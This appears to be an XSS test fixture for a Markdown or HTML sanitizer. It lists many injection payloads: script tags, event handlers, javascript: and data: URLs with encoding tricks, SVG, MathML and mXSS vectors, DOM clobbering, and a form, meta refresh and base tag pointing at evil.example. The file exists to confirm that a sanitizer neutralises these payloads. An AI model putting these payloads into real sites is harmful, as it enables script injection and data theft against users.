# XSS fixture

Every block below must render as inert text or be removed. If any of them
runs, `window.__xss` becomes defined and the test fails.

<script>window.__xss = 1;</script>

<img src="x" onerror="window.__xss = 2">

[javascript link](javascript:window.__xss=3)

<a href="javascript:window.__xss=4">js href</a>

<a href="JaVaScRiPt:window.__xss=5">mixed case</a>

<a href="&#106;avascript:window.__xss=6">entity-encoded</a>

<a href=" javascript:window.__xss=7">leading space</a>

<a href="java&#9;script:window.__xss=8">tab</a>

<a href="vbscript:msgbox">vbscript</a>

<svg onload="window.__xss = 9"><circle r="1"/></svg>

<svg><script>window.__xss = 19</script></svg>

<svg><a xlink:href="javascript:window.__xss=20"><text>svg link</text></a></svg>

<iframe src="javascript:window.__xss=10"></iframe>

<object data="data:text/html,<script>parent.__xss=11</script>"></object>

<embed src="data:text/html,<script>parent.__xss=12</script>">

<form action="https://evil.example/collect" method="post"><input type="text" name="secret" value="leak"><button>Send</button></form>

<style>body { display: none !important; }</style>

<div style="background: url(https://evil.example/pixel.png)">styled div</div>

<meta http-equiv="refresh" content="0;url=https://evil.example/">

<base href="https://evil.example/">

<link rel="stylesheet" href="https://evil.example/x.css">

<details open ontoggle="window.__xss = 13">details</details>

<marquee onstart="window.__xss = 14">marquee</marquee>

<video><source onerror="window.__xss = 15"></video>

<math><mi xlink:href="javascript:window.__xss=16">m</mi></math>

<noscript><p title="</noscript><img src=x onerror='window.__xss = 17'>">mxss</p></noscript>

<a href="data:text/html,<script>alert(1)</script>">data link</a>

<input type="text" value="not a checkbox">

<body onload="window.__xss = 18">

<div onclick="window.__xss=21" onmouseover="window.__xss=22">handlers</div>

<template><script>window.__xss=23</script></template>

<xss id="x" tabindex="1" onfocus="window.__xss=24"></xss>

<img name="getElementById" src="x">

<a id="querySelector">clobber</a>

<form name="body"></form>

![image with js](javascript:window.__xss=25)

- [ ] <input type="text" value="smuggled">

The end.
